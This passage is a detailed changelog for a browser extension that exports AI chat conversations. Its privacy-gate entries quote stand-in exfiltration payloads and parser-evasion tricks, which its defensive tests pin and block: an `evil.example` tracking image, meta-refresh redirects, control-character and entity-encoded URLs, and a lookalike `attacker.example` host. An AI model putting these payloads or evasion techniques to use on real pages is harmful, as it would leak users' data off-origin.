# Changelog

## Unreleased

- [done] PDF export: kill the font's coding ligatures and style inline code (v1.10.3) (2026-08-12).
  Both artifacts were filed off the v1.10.2 screenshot capture. Jetendard inherits JetBrains Mono's
  `calt`/`liga` sets, so `=>` reached the PDF's text layer as a single `⇒` glyph and did not survive
  a copy out; pdfmake forwards `fontFeatures` untouched to fontkit, where only the object form can
  turn a default-on feature *off*, so `defaultStyle` now carries `{calt: false, liga: false}` and the
  test lays `=>` out against the embedded font itself rather than asserting on the doc definition.
  Inline code was emitted as literal backticks with no styling to justify them; prose runs are now
  split so the span drops its backticks and takes the fenced block's tint. The span matcher is
  driven by what the repo's own serializer emits rather than by the single-backtick common case:
  `html-to-markdown`'s `inlineCode` widens the fence and pads the body whenever the code text holds
  a backtick, and `escapeMarkdownText` escapes every literal prose backtick, so the exporter closes
  on a backreference to the opening run, strips CommonMark padding, and never pairs an escaped
  backtick. Unpaired, empty and line-straddling backticks stay literal; the cases are pinned end to
  end through the real serializer.

- [done] Store submission assets refreshed for v1.10.2 (2026-08-11) → docs/store-listing.md. The
  listing had drifted two releases behind the code and stated two things that were false: the
  manifest description still read "ChatGPT first" and named only Markdown/PDF, and the listing
  copy still called bulk export "ChatGPT-only" after v1.10.0 shipped Claude's sidebar, project and
  `/recents` tracks. Both corrected, in `_locales` and in the listing. The screenshots (captured
  2026-07-29 against v1.7) were replaced with a five-shot set captured against v1.10.1: the
  ChatGPT toolbar with the export controls ringed, the project bulk panel, the same toolbar on
  Claude, the popup toggles, and a real exported PDF. Every conversation in them was created for
  the capture inside a throwaway project and every sidebar collapsed, so no pre-existing
  conversation title or account name appears. The small promo tile now carries the product name.
  Capturing an English frame on a Korean machine needed two moves that are now written down —
  `Accept-Language` reordering in the capture profile, and a temporary English `dist` locale —
  because macOS Chrome takes `chrome.i18n` from the OS and neither is discoverable from the code.
  The exported PDF also surfaced two rendering artifacts, both confirmed against the PDF's own
  text layer rather than the rendered page (the layer holds `=>` and literal backticks, so the
  substitution is the font's and the fence is the exporter's); they are filed, not fixed.

- [done] Claude /recents QA follow-ups (v1.10.1) (2026-08-11) → docs/live-dom-verification.md
- [done] Claude bulk export via /recents (v1.10.0) (2026-08-11) → docs/live-dom-verification.md
- [done] Fail loud when a Claude project route renders no conversation table (v1.9.2) (2026-08-10)
  → docs/live-dom-verification.md. Recorded the 2026-08-10 live-DOM session, which closed three
  blocked items **entirely by disproof — no selector needed changing**. Claude's sidebar needs no
  new handle: it is measured unique on both routes (one `aside`, zero chat links outside it) with
  no nav landmark at all, so the containment narrowing PR #58 could only derive is now attested. It
  does not page or recycle either — the Recents list is UI-capped at 20, the full list living at
  `/recents` — so the PR #61 early-exit had no hazard to guard; the real one it exposed is that
  bulk export cannot reach past those 20 rows, now filed. The artifact card carries **no** `data-*`
  at all and the feared duplicate-`text-xs` collision appeared in none of four kinds. The project
  table *does* carry a `data-cds` attribute, but pinning it was tried and reverted: the markdown
  table it would exclude is unreachable behind the existing route gates, while an attribute rename
  would have turned a working project list into a silent "no conversations" state. The shipped
  change is the hole that finding exposed — `listProjectConversations` now throws when it is on a
  project route and resolves no table, instead of reporting a full project as empty (AGENTS.md #4).
  Gemini's sidebar was measured too (page size 20, append-only, 1:1 anchor identity), unblocking
  its bulk track, while `/gem/<id>` proved to be a composer rather than a project home.
- [done] Claude adapter: degrade on odd sidebar anchors, reveal targets before opening, bound the stream-marker wait (v1.9.1) (2026-08-10)
- [done] Claude actionable adapter support (v1.9.0) (2026-08-09) → artifact markers, streaming completion,
  sidebar/project bulk export, and visible list-extraction failures
- [done] Extraction completeness (v1.8.2) (2026-08-01) → docs/live-dom-verification.md
- [done] Claude adapter: report attachments on the one-shot path, and mark a duplicated row index once (v1.8.1) (2026-07-29)
- [done] Claude adapter: read both attachment tile shapes, report files on mixed turns, and drop expanded thinking blocks (v1.8.0) (2026-07-29)
  → docs/live-dom-verification.md
- [done] Recorded the 2026-07-29 Claude/Gemini live-DOM session and closed all four open
  `[VERIFY]` items (2026-07-29). Two of them closed by **disproof**: Claude's attachment tiles never
  render inside `user-message` (0 across every measured turn, attached or pasted), so the mixed-turn
  worry that blocked the fix does not exist; and Gemini's generated-image and Canvas responses both
  DO render a `.markdown`, so the "no prose container" premise was wrong — a generated image leaves
  the container empty instead, which lands on the retry-forever error rather than the one written
  for it. The session also found Claude renders attachments in two tile shapes and the shipped
  selector matches only one, which blocks export of an attachment-only `.txt` turn outright; that
  an expanded thinking block is joined into the exported message; and `data-is-streaming`, the
  stream-completion signal the walk's termination condition was blocked on. Docs, selector stamps
  and stale code comments only — no behaviour change; the six fixes are queued in `backlog.md`.

- [done] Carried the measured page size across "Load more" calls (v1.7.5, 2026-07-29). The parity
  oracle seeded its page size from the rows already rendered, which is one page on a fresh sidebar
  but the whole list on a re-run — so the retry the incomplete warning asks for got only the dwell,
  not the parity-backed wait, exactly when a page is most likely still owed. A `knownPageSize` /
  `onPageSize` pair on the loader hands the size back to the caller and in again on the next call,
  so a retry seeds from evidence. Only a full-size increment ever reports a size: a bad seed is
  never cached, and a stale one costs wait time, never rows.

- [done] Closed the bulk panel's silent "Load more" truncation (v1.7.4, 2026-07-29). Implements the
  completeness oracle the 2026-07-28 live session unblocked, and takes that session's warnings as
  binding. Three layers. The dwell rises 5 s -> 11.5 s: not a hand-picked number, but what the repo's
  existing ratchet test demands once its stale 2830 ms constant is replaced with the confirmed
  7516 ms worst-case inter-batch gap (gaps beat the old 5 s dwell in BOTH cold runs, 5 of 74 batches,
  every one while the container was already clamped). `pageParityGate` adds the structural evidence a
  constant cannot: pages are a fixed 28 raw rows, so a full-size last batch means the walk stopped on
  a page boundary, and it holds the walk open a bounded 20 rounds more. It counts raw conversation
  rows, never the `/c/` ids -- those increment 11-27 per page, which is exactly why the oracle looked
  impossible from the counts the loader already had. And when that budget still runs out the panel
  says the list may be incomplete and keeps the button live rather than latching "All conversations
  loaded". Both holes the prior session flagged are handled rather than rediscovered: a batch is
  classified only after it stops growing (anchors lag their rows, so a full page sampled mid-hydration
  reads short -- judging per round would recreate the truncation), and an exact multiple of the page
  size ends on a full page that parity cannot distinguish from one page short, so the walk warns
  instead of failing loud, which would have broken those accounts permanently. The page size is
  derived from the largest settled batch, never hardcoded. Review caught two further defects, both
  reproduced before fixing: the doubt died between clicks so the retry the warning invites could latch
  "done" over a missing page, and the gate's first observed increment always defined the page size so
  a lone short final page warned on every load. -> `docs/live-dom-verification.md`

- [done] Closed the privacy gate's `<iframe srcdoc>` residual — the last known subresource vector the
  static scan could not see (2026-07-26). The tag scan resumes after each tag's own `>` on purpose,
  so a tag-shaped attribute VALUE (`<div data-html="<img src='https://…'>">`) is not re-matched as a
  real element; a real parser yields none, and a test pins that. `srcdoc` is the one attribute where
  the identical text IS parsed and IS live, so the two cases are indistinguishable by tag syntax and
  `findSubresourceViolations` returned `[]` for both. **Measured before fixing, as the finding
  demanded:** `happy-dom` parses a nested document but issues no requests, so the parser diff this
  file's other vectors were settled by was unavailable. A page in real Chrome against a local HTTP
  server logged a request for the nested image in *both* spellings — raw
  `srcdoc="<img src='/a.png'>"` and entity-encoded `srcdoc="&lt;img src='/b.png'&gt;"` — recorded in
  `docs/live-dom-verification.md`. The fix decodes the value and re-runs the whole collector over it,
  so `<meta refresh>`, `srcset`, `*:href` and CSS `@import` are all caught nested by the code that
  already handles them flat. Three calls the measurement forced: the decode covers the five
  predefined NAMED references, not just numeric ones — the opposite of `isLocalInTreeSrc`, where a
  surviving `&` is rejected and over-reports, because an undecoded `srcdoc` yields no tags at all and
  that is a *silent* hole; it is a SINGLE pass, since `&amp;lt;img …&amp;gt;` is literal text a
  two-pass decode would invent an element from; and `srcdoc` is read on every tag rather than
  `<iframe>` alone, the same exclusion-list reasoning `href` already follows. **QA then measured the
  new decoder itself and found a hole in it**, fixed in the same change: matching the named table
  case-insensitively and with the `;` optional decoded references a real parser leaves as TEXT, and
  the injected character ended the nested tag early — `&gt=1` (WHATWG's ambiguous-ampersand rule)
  and `&APOS;` (not in the table at all; `&AMP;`/`&LT;`/`&GT;`/`&QUOT;` are) each fetched in Chrome
  while the scan returned `[]`. The table is now matched case-sensitively with the carve-out applied,
  and two more payloads are pinned so the correction did not overshoot into the opposite hole.
  Worth stating as a rule: over-*reporting* is the safe direction here, over-*decoding* is not —
  a wrong decode does not add a false hit, it deletes a true one. Recursion is capped at
  `MAX_SRCDOC_DEPTH` and **reports the unscanned nesting** instead of returning clean (AGENTS.md #4).
  **What deliberately did not change:** the runtime control. `frame-src 'none'` in the extension-pages
  CSP already blocks such a frame outright, so unlike the `<meta http-equiv=refresh>` vector this was
  never unguarded at runtime — the static half was simply behind. Known cosmetic residual: a
  `url()`/`@import` written unencoded inside a `srcdoc` is now reported twice, once flat and once
  nested; duplicate over-reporting, pinned as such. Test-only change, so no version bump — matching
  PRs #41 and #44, which likewise touched neither `src/` nor the manifest.

- [done] Dropped `https://chat.openai.com/*` from the manifest host list — it granted access to
  nothing (2026-07-26). The 2026-07-25 `host_permissions` experiment had already found the origin
  308-redirects to `chatgpt.com`, but deliberately did not act on it: a redirect measured once is
  not proof it is permanent, and a dropped entry fails *silently* (no toolbar, no error) if the
  origin ever serves pages again — the shape AGENTS.md #4 exists to prevent. So it was re-measured
  before removal, and widened past what the first session checked: `/c/<id>` **and the bare root**
  both return HTTP 308 to `chatgpt.com`, so the redirect is **whole-origin**, not path-scoped.
  There is no page anywhere on that host under any URL shape, which is what makes the silent-failure
  risk bounded rather than speculative. Two sessions a day apart now agree. Measured with plain
  `curl`, no browser — sufficient for this claim and only this claim, since a 308 is decided before
  any document exists; recorded as such in `docs/live-dom-verification.md` rather than dressed up as
  a live session. The entry was charging real cost for that zero reach: a line in the install-time
  host warning and a row in the Web Store permission justification, which golden principle #2
  (least privilege) forbids. Removing it from `HOSTS` also drops it from the crxjs-generated
  `web_accessible_resources[0].matches`, which derives from the same array. **What deliberately did
  not change:** `SUPPORTED_HOSTS` in `src/adapters/chatgpt/matches.ts` still lists the hostname — a
  JS constant carries no permission cost, the existing URL tests stay green untouched, and keeping
  it means restoring the origin is a one-line manifest change if OpenAI ever stops redirecting. The
  asymmetry is commented on both sides so it does not read as drift and get "fixed" one-sided. Held
  by a new assertion in `test/privacy/manifest-least-privilege.test.ts` (549 tests), which compares
  each declared pattern's host component reduced to its registrable domain rather than matching the
  pattern string. Review earned that shape twice over: a first draft used a substring test, which
  CodeQL correctly flagged (`js/incomplete-url-substring-sanitization` — `includes()` also matches
  `chat.openai.com.attacker.example`), and the reviewer separately caught that both the substring
  test and the whole-string one let `https://*.openai.com/*` through, a re-add strictly **wider**
  than the entry being removed. Label arithmetic rejects all of it: verified red by neutralization
  against `https://chat.openai.com/*`, the scheme-wildcard `*://chat.openai.com/*`, and a
  path-scoped `https://chat.openai.com/c/*`. Re-adding any openai.com origin turns that gate red on
  purpose — every one other than the measured host is simply unmeasured, and the way back is to
  re-measure and restore with a new date, not to delete the assertion.
  `docs/PRIVACY.md` and `docs/store-listing.md` (EN + KO + the justification table) updated to match.
  No new permissions, hosts, or network calls.

- [done] Closed two more privacy-gate subresource vectors — SVG `<image>` and
  `<meta http-equiv="refresh">` (2026-07-26). Both were left open by PR #42 and confirmed against
  happy-dom as markup a real parser resolves to a genuine fetch or navigation. Not "the last two":
  review turned up `<iframe srcdoc>` while closing these, and it is now tracked in `tasks.md` rather
  than left unrecorded. Test and docs only; no version bump, matching PR #40/#41 (PR #42 bumped
  because it shipped a manifest change).

  **SVG `<image xlink:href>`** fetches exactly like an `<img>`, but `href` was checked on
  `<link>`/`<base>` only, so neither it nor the SVG 2 plain-`href` form was read. Rather than widen
  that allowlist to `image`/`use`/`feImage`, the check is **inverted**: `href` — and any prefixed
  `*:href` — is now checked on every tag except `<a>`/`<area>`. The set of tags that fetch from
  `href` is not one anybody can enumerate correctly and keep correct, and getting it wrong in the
  allowlist direction is a silent hole; by exclusion, every misjudgement is an over-report instead,
  and a local relative path passes either way. `<a>`/`<area>` stay exempt in the SVG namespace too —
  that is navigation, and a legitimate outbound link must not redden the gate. A rebound prefix
  (`xmlns:xl` + `xl:href`) was raised in review as an evasion, then measured inert: an HTML document
  binds no namespaces, so it lands as a null-namespace attribute SVG never resolves. It is flagged
  anyway, so trusting the line needs no recall of the parser's adjustment table. A remote SVG
  `<script href>` needed no new rule — the `<script>` half already flags anything without a relative
  in-tree `src=` — and is pinned so the misleading `inline <script>` label is not "fixed" into a hole.

  **`<meta http-equiv="refresh" content="0;url=…">`** is the one vector with **no runtime control
  behind it**: the CSP restricts subresources and executable code, and Chrome dropped `navigate-to`,
  so no directive would stop an automatic top-level navigation carrying whatever the URL
  interpolates. Here the static gate is not the backup, it is the whole control. `content=` parsing
  follows the spec's shared declarative refresh steps in the over-reporting direction — time and
  `url=` both optional, `;`/`,` separators — while `content="0"` and an empty `url=` stay unflagged
  as same-document reloads.

  Review caught three more holes, each measured rather than argued. **Character references in the
  refresh *syntax*** — `ref&#x72;esh`, `0&#59;url=`, `u&#x72;l=` — arrive decoded at the refresh
  algorithm but were compared and parsed as raw text, so decoding moved ahead of the grammar
  instead of applying only to the URL it had already failed to extract. **C0 control characters**:
  `normalizeUrlValue` ended in JS `.trim()`, whose whitespace set is not the URL parser's, so
  `&#1;https://evil.example/` kept a control character in scheme position and read as a local path
  while a browser fetched off-origin — 26 such code points, enumerated; fixed by stripping exactly
  the parser's C0-control-or-space set, which also correctly stops stripping a leading NBSP the URL
  parser keeps. That one predates this change and hit `<img src>` too. **`imagesrcset`** on a
  preload link was absent from the attribute set.

  Review caught a real hole in the first cut too: the helper read the attribute list last-wins, so
  `<meta content="0;url=https://evil…" http-equiv="refresh" http-equiv="not-refresh">` returned
  clean while a real parser — measured in happy-dom **and** headless Chrome — keeps the *first*
  occurrence and navigates. Fixed by taking the **union** over duplicates (any `http-equiv` reading
  `refresh` arms it, every `content` is classified) rather than mirroring first-wins, so the gate
  does not stay coupled to a tokenizer rule it cannot observe; the cost is one over-report on
  already-malformed markup, asserted rather than tolerated silently. Every new payload is pinned,
  and removing either guard was verified to turn exactly the new tests red.

- [done] Closed the HTML remote-subresource egress path (2026-07-26). PR #41 taught the gate to read
  `<script>` tags; everything else in `src/**/*.html` still passed both halves unread, and
  `<img src="https://evil.example/p.gif?d=leak">` was verified green. That was live, not merely
  theoretical: the manifest declared no CSP, so MV3's default restricts executable code only and left
  `<img>`/`<iframe>`/`<form action>`/CSS `url()` free to reach any origin from the options page.

  Two controls now, deliberately layered. The **primary** one is a real
  `content_security_policy.extension_pages` in `manifest.config.ts` — `script-src`/`object-src`/
  `img-src`/`media-src`/`font-src 'self'`, `style-src 'self' 'unsafe-inline'`, `frame-src`/
  `form-action`/`base-uri 'none'` — which blocks the fetch rather than merely noticing it. Measured
  on the loaded unpacked build, not assumed: a remote `<img>`, a remote `<iframe>` and a remote CSS
  `@import` each produced their directive's violation, an in-package image still loaded, and the
  page's inline `<style>` and module script were unaffected (`docs/live-dom-verification.md`).
  `connect-src 'self'` closes fetch/WebSocket/EventSource from that page too — added on review after
  the original "crxjs dev HMR needs localhost" justification turned out not to apply to this repo,
  which has no `dev` script; with no `default-src`, an unlisted directive is unrestricted rather
  than defaulted, so that omission was a hole. All three are measured blocked, and an in-package
  `fetch` still works. The gate's JS half gained `WebSocket`/`EventSource` for the side no CSP of
  ours reaches: a content script runs in the host page's world.

  The **backup** is the static gate, widened from `<script src>` to every attribute a browser
  fetches from with no user action — `src`, `srcset`, `poster`, `data`, `action`, `formaction`,
  `href` on `<link>`/`<base>` — plus CSS `url()` and `@import`. Two calls made explicitly rather
  than by default: `<a href>` is NOT checked (user navigation, not a fetch, so a legitimate outbound
  link cannot redden the gate) and `data:` IS rejected. Every payload was diffed against happy-dom
  instead of reasoned about, including the tokenization shapes that produced five false negatives in
  the `<script>` half; both the gate and the CSP assertion were verified to fail under targeted
  neutralization.

  Review then attacked both layers and four findings were folded in rather than deferred: the CSP
  assertion compared by substring, so a *widened* directive (`img-src 'self' https://cdn.evil`)
  passed green — it now compares each directive's source list exactly; a scheme could be smuggled
  past the value test by HTML character references or by an ASCII tab, both of which the browser
  normalizes away before fetching, so values are now normalized before classification; the legacy
  `background` attribute and a whitespace-free `@import"…"` were both unread; and the tag scan
  resumed inside the attribute text it had just consumed, making a tag-shaped attribute *value* a
  false positive. Two vectors remain statically uncovered — SVG `<image xlink:href>` and
  `<meta http-equiv="refresh">` — recorded in `tasks.md` and disclosed in `docs/conventions.md`
  rather than papered over; the CSP covers the first at runtime, and the second has no directive
  left to add, which makes it the one vector with no runtime control behind it.

- [done] Closed the privacy gate's HTML residual (2026-07-26). The `src/`-wide widening fixed
  which directories are walked, not which file types are read: the collector matched
  `.tsx?|jsx?|mjs|cjs`, so `src/options/index.html` — the one HTML file this extension ships —
  was walked and never read, and an inline `<script>` there would have carried a `fetch()` past
  the gate. Rather than run the JS tokenizer over HTML (it mis-tokenizes apostrophes in prose
  and `<!-- -->` comments), the gate now asserts the narrower rule that is already required:
  every `<script>` in `src/**/*.html` must load a relative in-tree `src=` module. MV3's CSP
  forbids inline script in extension pages, and an in-tree module is by definition one of the
  .ts/.js files the existing scan already reads — so the two halves cover every executable-code
  file type present in `src/` (not every file: the `.ttf`/`.txt` under `src/export/fonts` are
  inert, and a future `.json`/`.vue` would reopen the gap).

  Five parser-differential false negatives were found and closed — three by successive QA
  passes, two more by review, each pinned as a regression test verified against a real parser
  (Chromium DOMParser / happy-dom) rather than asserted from the regex: `data-src=` read as the
  real `src=`; a `src=` substring inside another attribute's quoted value; a `>` inside a quoted
  value truncating the tag so the remainder re-tokenized as a bare `src=`; and — because quote
  state was toggled on any quote char instead of following the HTML tokenizer's attribute
  states — a quote in attribute-NAME position (`<script x">`) or inside an UNQUOTED value
  (`<script data-x=a"b >`) running the scan past the true tag end into the script body, where a
  `src=` in the code masked the inline script. Attribute matching now walks attributes by name
  and tag-end scanning is attribute-state-aware. Review also caught that any `src` value was
  accepted, so a remote `<script src="https://…">` — the exact egress Golden Principle #1
  forbids — passed untouched; absolute, protocol-relative, `data:` and `..`-escaping sources
  are now violations.

  `docs/eval-criteria.md`'s privacy rubric and `docs/conventions.md`'s invariant now state the
  enforced scope precisely, including the residual they previously overclaimed: the HTML half
  checks `<script>` only, so a remote subresource (`<img src>`, `<iframe>`, `<form action>`) is
  a live egress path MV3's default CSP does not restrict and the gate does not read — recorded
  in `tasks.md`. Tests 496 → 513. Test and docs only — no production code changed and the
  packaged artifact is byte-identical, so no version bump.
- [done] Widened the privacy gate to all of `src/` (2026-07-26). `SCAN_DIRS` in
  `test/privacy/no-external-network.test.ts` went from `['src/adapters', 'src/export',
  'src/content']` to `['src']`, so `src/core`, `src/options`, `src/settings`, `src/types` and
  `src/strings.ts` — previously true-by-inspection only — are now mechanically enforced. Golden
  Principle #1 was always written as a whole-extension invariant; the gate now matches it.
  Scanned code files 25 → 35. No production code changed and the packaged artifact is
  byte-identical, so no version bump. The widening is not cosmetic: a probe `fetch()` appended to
  `src/core/errors.ts` — a newly-covered file — turned the gate red with
  `src/core/errors.ts:16 — fetch()` and green again on revert. Four prose sites that stated the old
  scope were re-widened — `AGENTS.md` Golden Principle #1, `docs/conventions.md` "Privacy
  invariant", `docs/live-dom-verification.md`, and `.claude/agents/qa-verifier.md`, which had been
  steering every QA spawn's privacy grep at the narrower subtree. Review corrected the first pass
  at those: it had said the gate covers "all of `src/`", which overclaims, because the collector
  matches `.tsx?|jsx?|mjs|cjs` and so walks past `src/options/index.html` without reading it. The
  enforced scope is now stated as *every JS/TS file under* `src/`, with the HTML gap named where it
  matters and filed to `tasks.md` rather than papered over.
- [done] Dropped `host_permissions` from the manifest, closing the `[CONSTRAINT]` that asked
  whether it was needed at all. Version bumped 1.7.0 → 1.7.1, since this changes the packaged
  manifest's granted permissions. Settled by experiment rather than by argument, as the ticket
  required: under MV3 a *statically declared* content script injects on `content_scripts.matches`
  alone, and the grant only adds cross-origin fetch/cookie access from an extension context this
  extension does not have. A build with the grant removed was loaded unpacked and read back from
  `chrome-extension://<id>/manifest.json` — Chrome's own parse, not an inference about which bundle
  was live — then exercised: the toolbar mounted and exported on chatgpt.com (Markdown 716 B, bulk
  panel enumerating), claude.ai (Markdown 13,607 B, PDF 79,853 B with a valid `%PDF-1.3` header) and
  gemini.google.com (Markdown 15,049 B). The one thing that could plausibly have broken did not, for
  a checkable reason: crxjs emits the content script as a loader that dynamically imports the real
  bundle over a `chrome-extension://` URL, and it derives that `web_accessible_resources` block's
  `matches` from the same `HOSTS` list rather than from `host_permissions`. **`chat.openai.com` was
  not confirmed** — it 308-redirects to chatgpt.com, so no document loads there for a content script
  to run in, with or without the grant. That is evidence there is nothing to break, not evidence the
  host works, and whether to drop the now-inert `HOSTS` entry is left as a separate `tasks.md` item
  rather than assumed. Note this does **not** shrink the install-time permission warning, which
  Chrome also derives from `content_scripts.matches`; the win is a smaller granted API surface.
  `test/privacy/manifest-least-privilege.test.ts` now holds the decision mechanically, so re-adding
  the grant forces a fresh measurement instead of a silent revert.

- [done] Rendered-UI verification of the **loaded extension** on Claude and Gemini, closing the two `[VERIFY]` items that asked for it. Docs and comments only — no code, no new permissions, no version bump. The load-bearing result is a correction rather than a measurement: `docs/live-dom-verification.md` stated as fact that **"the MCP browser cannot load the unpacked extension"**, and four items had been deferred on that premise. It is false. The MCP config passes no `--load-extension`, but the browser it launches is an ordinary Chromium whose extensions page is available, so `dist/` loads by hand into the *running* browser and the content script injects normally. The capability is per-session, not persistent — the MCP profile is temporary, so the by-hand load repeats every run exactly like the login, and what became automatable is everything after it. Three further facts do that automating, and each cost a wrong turn to find: `chrome://extensions/` **is scriptable**, so the extension's id/version/enabled state read out of `extensions-manager`'s nested shadow roots and `#dev-reload-button` can be clicked to pick up a fresh `npm run build` — which is how "does the loaded build match HEAD?" stopped being an assumption (it was 1.7.0 either way, but the tab must be reloaded too, since an extension reload orphans the content script already in it); exports must be captured as **real downloads** via Playwright's `download` event, because content scripts run in an **isolated world** and a `URL.createObjectURL` patch installed from the page never sees the extension's calls — the obvious probe, and it cannot work, while PDF only ever had this route since its bytes come from pdfmake's own internal blob URL; and `page.emulateMedia({ colorScheme })` really does move both apps (Claude flips `html[data-mode]`, Gemini swaps `body.light-theme`/`dark-theme`), so the light-and-dark half was measured instead of being narrowed to a mechanism argument as planned. **Claude, on a 56-row conversation opened cold:** 6 rows rendered (8 turn nodes) against a declared `aria-setsize` of 56, and the export produced **56 messages — equal to the declared total**, 28 user / 28 assistant strictly alternating, zero empty, one `[File: …]`. That equality is the strong form of a completeness proof the guard already provides by failing loud, and it is the first time the shipped walk ran on the real recycling virtualizer rather than a fake; a one-shot `querySelectorAll` at that cold load would have exported **6 of 56 rows** — 8 turn nodes, against the 16 the earlier 68% figure was derived from, which was measured at the bottom of a page whose prior scroll state that session never recorded and counted turn nodes rather than rows, so the two are not directly comparable even though the cold load is the worse case. The attachment-only row — no `user-message` node at all, the case that made such conversations unexportable before PR #35 — exported as its file marker against the real page for the first time. Rows rendered *after* the export (17, `data-index` 39…55) re-confirm recycling from the other side, `scrollTop` came back to the byte (8486 → 8486) — recorded with the caveat that the list also grew 9381 → 10545 px during the walk and *where* that growth landed was not measured, so what is proven is the raw restore and not that the reader's view was preserved — and each of the four formats took 7.0–7.5 s, producing four real files (json 16,448 B, md 13,607 B, pdf 79,853 B with a `%PDF-` header, html 16,256 B). Its toolbar mounted inside `[data-testid="wiggle-controls-actions"]` ahead of Share with `placement="native"` (never the overlay fallback), and **all 28 `toolbarButtonClass` tokens were present on Claude's own Share button**, giving our buttons a computed color *identical* to it in both themes (`rgb(11,11,11)` light, `rgb(255,255,255)` dark) — they inherit the theme rather than matching it. **Gemini, on a 31-exchange conversation created for the test:** 10 of 31 rendered at a cold load and **62 messages exported = 2 × 31**, 31/31 roles, zero empty, so the walk paged in the 21 exchanges the cold load withheld where a one-shot read would have lost 68% silently. Two numbers turned prior arguments into measurements: the **page size held at 10 at 31 exchanges**, extending `INITIAL_PAGE_SIZE`'s evidence from 11/16/17; and the **bottom-distance restore is confirmed on a real paging list** — distance from the bottom was 72 px before and 72 px after while `scrollHeight` grew 3049 → 8152, where restoring the raw `scrollTop` would have dropped the reader 5103 px earlier in the conversation, the hazard that design exists for. All four formats were downloaded and measured as files on the previously-measured 17-exchange conversation (34 messages, PDF carrying a real `%PDF-` header); that run is recorded as a **download** result only, because Gemini kept its walked state across a same-URL `page.goto` so the list was already complete when the export ran — a re-`goto` is not a cold load, a **new tab** is, and mistaking the two would have banked a paging claim the run did not support. Incidentally re-confirmed: `/app` mounts no buttons (`isConversationPage()` excluding the new-chat route, working), and `aria-setsize` is still 0 document-wide on Gemini. Both results carry an explicit scope limit of **one cold-load conversation per provider** (Gemini was measured on two conversations, but only the 31-exchange one was a cold load). Also synced two now-false blocked markers in `tasks.md` — the bulk-panel `[VERIFY]` and the `host_permissions` least-privilege `[CONSTRAINT]` were both deferred on the same load-unpacked premise, so each is annotated as actionable with what it actually needs (2026-07-25)

- [done] Gemini adapter (single-conversation export) — the extension now mounts its export buttons on `gemini.google.com/app/<id>` and writes the conversation to Markdown/PDF/JSON/HTML locally, the third provider behind the `ConversationAdapter` seam. Scope is single-conversation only (`provider`/`matches`/`extract`/`toolbarMount`/`toolbarAnchor`/`toolbarButtonClass`); the sidebar bulk and Gems/projects tracks are left unimplemented rather than shipped unverified, and the content layer already hides the corresponding controls when those members are absent. Every selector was earned from a live Playwright MCP session against the logged-in page before a line was written (AGENTS.md #5), recorded in `docs/live-dom-verification.md` → Gemini. **The load-bearing finding: a fresh page load renders only the newest 10 exchanges and pages older ones in on scroll-up** — measured three times (conversations of 11, 16 and 17 exchanges each rendered exactly 10), with the remainder arriving in batches as the walk nears the top of the loaded range (10 → 16 in a single round, `scrollHeight` 5019 → 9129). So a one-shot `querySelectorAll` would have exported **10 of 17 exchanges, losing 41% silently** (AGENTS.md #4). Unlike Claude's list nothing is ever trimmed (a 35-round up-then-down walk held the full rendered count on every round), so `extract` walks the `infinite-scroller[data-test-id="chat-history-container"]` port to the top and then does **one ordered read** — which is not merely simpler but the only order-preserving option, since Gemini's sole per-exchange identity is an opaque hex container `id` that cannot be sorted. That append-only premise is measured at 11–17 exchanges, not proven at every scale, so it is **guarded rather than trusted**: a final read yielding fewer exchanges than the walk's high-water mark fails loud instead of exporting the remainder. Three structural facts changed the implementation rather than being assumed: Gemini has **no completeness oracle at all** (`aria-setsize` resolves to 0 document-wide, no `aria-posinset`, no numeric index), so the walk's settle dwell is the only bound — and it deliberately requires an unchanged scroll height *and* rendered count on top of `scrollTop === 0`, because arriving at the top is precisely what *triggers* the next batch; a naive read of the user's prompt captures Angular Material's visually-hidden label (live: `"말씀하신 내용 <the prompt>"`), so prompts are read from `p.query-text-line` with the span stripped on the fallback path; and Gemini declares a fence's language in a header label that is a **sibling** of the `<pre>` (a third convention, distinct from Claude's `<code class="language-*">` and ChatGPT's in-`<pre>` label), which core's `codeLanguage` cannot see and which would otherwise serialize as a paragraph of prose above the fence — so the adapter copies it onto the `<code>` in a clone and deletes the label, leaving core untouched and provider-agnostic (AGENTS.md #3). Gemini is also the first provider to expose a real **stream-completion signal**: the generating response's `.markdown` carries `aria-busy="true"`, and it stays true ~2.4 s after the text stops growing, so extraction fails loud on a still-generating answer instead of exporting a fragment. Review (Claude ×2, agy, Codex) changed the adapter in six further ways, four of them closing a fail-loud hole the first revision had: **blank lines in a user prompt were being deleted** — a blank line renders as an EMPTY `p.query-text-line` and `.filter(Boolean)` dropped every one, which a live re-measurement then quantified at 42 of 136 line elements on a real prompt, flattening all 42 of its paragraph breaks (the same measurement closed the open multi-line `[VERIFY]`, since 136 line elements settle that an N-line prompt renders N of them); the **unwalkable path exported whatever happened to be rendered** — a missing or zero-height scroll port cannot page in what Gemini withholds and Gemini declares no total, so that path is now the one place a partial could go out silently, and it fails loud unless the page holds fewer than a full page and is therefore provably complete; the **step cap charged waiting rounds to a distance-derived budget**, so a conversation needing nine batches could exhaust its fixed ~13 spare rounds and report "timed out" on a healthy page — travel and stalling are now separate budgets, and only movement is charged; and a **response rendering no prose container at all** got the "may still be loading, try again" message, advice that can never clear, now a distinct report-this error plus a `[VERIFY]` for the unmeasured shapes (a generated image, the canvas panel) that reach it. Two smaller ones: restoring the pre-walk `scrollTop` put the reader thousands of pixels earlier in the conversation, because paging grows the list ABOVE them — the walk now restores distance from the bottom; and `assertNotStreaming`'s comment described a pre-walk check that did not exist, so a user exporting mid-answer sat through the whole walk before being told to wait — now it really is checked first, pinned by a test asserting zero scroll writes. Also on review's advice, the fixture's two exchange ids and a conversation id in the tests and docs, all copied from the live capture, were replaced with obvious placeholders: not credentials, but real artifacts of the author's account in a public repo.

64 new tests (429 → 493) against a synthetic fixture reproducing the captured skeleton; the three scroll/truncation guards were each verified to fail under targeted neutralization, and the in-flight-batch test was **rewritten after the first version passed under the broken code** — at two batches deep, position-only termination happens to collect everything by luck, so the fake needed three. One design flaw surfaced from a test rather than review: deriving the step cap from the *current* scroll height let a shrinking list pull the cap below the distance already travelled, masking a real shortfall as a timeout; the cap now comes from the largest height seen. Re-probed after implementation against the live 17-exchange conversation with the shipped selectors copied (not imported): 17/17 exchanges, 34 messages, 0 unreadable turns, 0 label leaks, scroll position restored, and every `toolbarButtonClass` token present on Gemini's own header button. New host permission `https://gemini.google.com/*` — scoped to the subdomain, not `google.com`, so it grants no access to Search, Gmail or any other Google service; `permissions` unchanged at `["storage"]`; no network calls. Four things are recorded but deliberately not acted on because their markup was never captured: multi-line prompts (Gemini's Quill composer rejected every synthetic newline — the reader handles either shape), prompts carrying files or images (`user-query img` was 0 throughout), the Gems/project 